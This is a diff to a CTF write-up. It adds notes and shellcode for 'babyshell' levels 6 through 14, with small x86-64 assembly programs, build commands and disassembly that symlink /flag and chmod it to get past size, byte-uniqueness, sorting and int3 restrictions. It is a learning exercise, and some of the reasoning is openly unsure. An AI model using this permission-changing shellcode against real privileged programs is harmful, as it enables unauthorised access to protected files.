@@ -555,6 +555,8 @@ flag:
         .ascii "/flag"
 ```
 
+**Removing write permissions from first 4096 bytes of shellcode===>**
+
 level6: **Removing write permissions from first 4096 bytes of shellcode**
 
 In order to get the flag, just directly add 4096 repeats in the front of the level5 code
@@ -658,4 +660,130 @@ exit(42)                                = ?
 ./1 #can get the flag
 ```
 
-> **Actually I still don't know why the stderr, stdout, stdin which were being closed work and why the `chmod` command can solve this question. I just know it is a way to be able to cat the flag**
+> **Actually I still don't know why the stderr, stdout, stdin which were being closed work and why the `chmod` command can solve this question. I just know it is a way to be able to cat the flag**. Maybe the chmod didn't use the stdin, stdout and stderr so we bypassed it.
+
+level8: **only reading 0x12 bytes from stdin.**
+
+So we should replace the command like `mov xxx, xxx` and `xor xxx, xxx` with the `push` , `pop` and `mov xxx, rsp`. the `chmod` is what we need to do.
+
+First, the linux **soft link** and **chmod** has a feature that Chmod does not work directly on soft links(which is the link file) when it operates on them, but directly on the files it points to(which is the true file). It just like we link a `f` file in my home/hacker directory to the `/flag` and we chmod the `f` file not the `/flag` file, if we succeed in changing the permissions of `f` file, we succeed in changing the permissions of `/flag` file, too.
+
+```shell
+ln -s /flag f #create the soft link
+```
+
+Second, we use assembly file to chmod: (less than 0x12(18 bytes))
+
+```assembly
+.global _start
+.intel_syntax noprefix
+_start:
+	push 0x66 #b'f\x00'
+	mov rdi, rsp #rdi: f
+	push 4	
+	pop rsi	#rsi: 4
+	mov al, 0x5a # chmod('f',4)
+	syscall
+```
+
+Finally, we got a 0xc bytes shellcode.
+
+```shell
+gcc -nostdlib -static -o 1 1.s & objcopy --dump-section .text=out 1 & cat out | /challenge/babyshell_level8
+==================================================================
+      Address      |           Bytes          |  Instructions
+--------------------------------------------------------------------
+0x000000002df88000 | 6a 66                    | push 0x66
+0x000000002df88002 | 48 89 e7                 | mov rdi, rsp
+0x000000002df88005 | 6a 04                    | push 4
+0x000000002df88007 | 5e                       | pop rsi
+0x000000002df88008 | b0 5a                    | mov al, 0x5a
+0x000000002df8800a | 0f 05                    | syscall
+===================================================================
+cat f #or cat /flag can get the flag
+```
+
+level9: **modified shellcode by overwriting every other 10 bytes with 0xcc.**
+
+> 0xcc, when interpreted as an instruction is an **`INT 3`**, which is an interrupt to call into the debugger.Every 10 bytes, our command is overwritten with 10 interrupt commands(int 3 ), so we need to skip it using the `.rept .endr` and `jmp`
+
+```assembly
+.global _start
+.intel_syntax noprefix
+_start:
+	push 0x66 		#b'f\x00'  	#6a 66
+	mov rdi, rsp				#48 89 e7
+	#push 4
+	#pop rsi
+	mov sil, 4					#40 b6 04
+	jmp next					#eb 0a--->10 bytes
+.rept 10
+	nop
+.endr							#10 0xcc
+next:
+	mov al, 0x5a
+	syscall
+```
+
+```shell
+cat f # get flag
+```
+
+level10: **sorted your shellcode using bubblesort. This sort processed your shellcode 8 bytes at a time.**
+
+Keep in mind the impact of memory endianness(The Byte Storage Order of the memory) on this sort(e.g., the LSB being the right-most byte).
+
+>  the code of level8 can go through it
+
+```c
+int sort_max = shellcode_size / sizeof(uint64_t) - 1;
+    for (int i = 0; i < sort_max; i++)
+        for (int j = 0; j < sort_max-i-1; j++)
+            if (input[j] > input[j+1])
+            {
+                uint64_t x = input[j];
+                uint64_t y = input[j+1];
+                input[j] = y;
+                input[j+1] = x;
+            }
+printf("This sort processed your shellcode %d bytes at a time.\n", sizeof(uint64_t));
+//it print "This sort processed your shellcode 8 bytes at a time"
+```
+
+the sort_max = 12/8 -1 = 0 so we just skip it (?)
+
+```assembly
+6a 66             | push 0x66
+48 89 e7          | mov rdi, rsp
+6a 04             | push 4
+5e                | pop rsi
+b0 5a             | mov al, 0x5a
+0f 05             | syscall 
+```
+
+level11:**bubblesort+close stdin, which means that it will be harder to pass in a stage-2 shellcode**
+
+because we only have stage-1 shellcode so we can still use the code of level10 and get the flag.
+
+level12: **requires that every byte in your shellcode is unique**
+
+>  This level means that each byte of the machine code required to be entered is different. In level11 will be failed in bytes5 because push command is used twice so there're two 6a
+
+```assembly
+.global _start
+.intel_syntax noprefix
+_start:
+	push 0x66 #b'f\x00'
+	mov rdi, rsp
+	mov sil, 4
+	mov al, 0x5a
+	syscall
+# get the flag
+```
+
+level13: **only reading 0xc bytes from stdin**
+
+in level8 we have already make the code size to 0xc bytes so we can use the level12 code as well. The `f` file is useful for level8 to level13.
+
+level14: **only reading 6 bytes from stdin**
+
